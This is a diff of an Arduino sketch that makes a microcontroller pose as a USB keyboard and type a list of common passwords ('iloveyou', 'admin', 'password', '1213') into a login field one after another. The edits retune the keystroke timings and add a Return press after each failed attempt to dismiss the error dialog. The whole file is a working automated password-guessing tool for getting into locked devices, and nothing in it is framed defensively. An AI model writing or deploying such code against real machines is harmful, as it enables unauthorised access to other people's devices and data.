@@ -1,28 +1,28 @@
 #include <Keyboard.h>
 
+// ---------- PASSWORDS TO TRY ----------
 const char* PASSWORDS[] = {
-  "1234",
+  "iloveyou",
+  "admin",
   "password",
-  "kali"
+  "1213"
 };
 const int PASSWORD_COUNT = sizeof(PASSWORDS) / sizeof(PASSWORDS[0]);
-
-const unsigned long TYPE_DELAY       = 120;  
-const unsigned long PRE_SUBMIT_DELAY = 250;  
-const unsigned long ERROR_WAIT       = 3000; 
-const unsigned long AFTER_ATTEMPT    = 1500;  
+const unsigned long TYPE_DELAY       = 120;   
+const unsigned long PRE_SUBMIT_DELAY = 200;   
+const unsigned long ERROR_WAIT       = 3000;  
+const unsigned long OK_PRESS_DELAY   = 200;   
+const unsigned long AFTER_OK_WAIT    = 3000;  
 
 void setup() {
-  delay(3000);                 
+  delay(3000);                
   Keyboard.begin();
 
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
-  delay(2500);
+  delay(2000);
 
-  Keyboard.press(KEY_TAB);
-  Keyboard.releaseAll();
-  delay(400);
+  clearField(20);
 
   for (int i = 0; i < PASSWORD_COUNT; i++) {
     tryPassword(PASSWORDS[i]);
@@ -35,7 +35,6 @@ void loop() {}
 
 void tryPassword(const char *pw) {
   clearField(20);
-
   for (int i = 0; pw[i] != '\0'; i++) {
     Keyboard.print(pw[i]);
     delay(TYPE_DELAY);
@@ -48,14 +47,18 @@ void tryPassword(const char *pw) {
 
   delay(ERROR_WAIT);
 
-  delay(AFTER_ATTEMPT);
+  Keyboard.press(KEY_RETURN);
+  delay(OK_PRESS_DELAY);
+  Keyboard.releaseAll();
+
+  delay(AFTER_OK_WAIT);
 }
 
 void clearField(int times) {
   for (int i = 0; i < times; i++) {
     Keyboard.press(KEY_BACKSPACE);
-    delay(50);
+    delay(60);
     Keyboard.releaseAll();
-    delay(50);
+    delay(60);
   }
 }
